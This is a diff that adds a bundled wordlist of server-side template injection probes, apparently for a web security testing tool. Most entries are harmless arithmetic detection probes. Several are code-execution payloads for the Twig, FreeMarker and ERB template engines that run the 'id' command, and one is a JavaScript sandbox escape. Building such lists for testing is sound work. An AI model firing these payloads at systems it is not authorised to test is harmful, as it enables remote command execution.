@@ -1,0 +1,27 @@
+# burpsy bundled wordlist: template injection probes (basic)
+# Source: publicly documented industry-standard SSTI probes (PayloadAllTheThings' SSTI
+#   section, the portswigger-research-derivation-free public polyglot tradition).
+# Licence basis: public domain / permissively-licensed community content; nothing here is
+#   extracted from PortSwigger's shipped resources.
+{{7*7}}
+{{7*'7'}}
+${7*7}
+${{7*7}}
+<%= 7*7 %>
+#{7*7}
+#set($x=7*7)
+${{7*7}}
+{{constructor.constructor('alert(1)')()}}
+{{dump()}}
+{{self}}
+{{_self.env.display("{{7*7}}")}}
+{{_self.env.registerFilter("x","exec")}}{{_self.env.filter("x","id")}}
+<%= `id` %>
+{{_self.env.setFilter("x","exec")}}{{_self.env.filter("x","id")}}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+{{7*7}}[[3*3]]
+${7*7}
+<%= 7*7 %>
+{{ 7*7 }}
+{7*7}
+{{debug}}
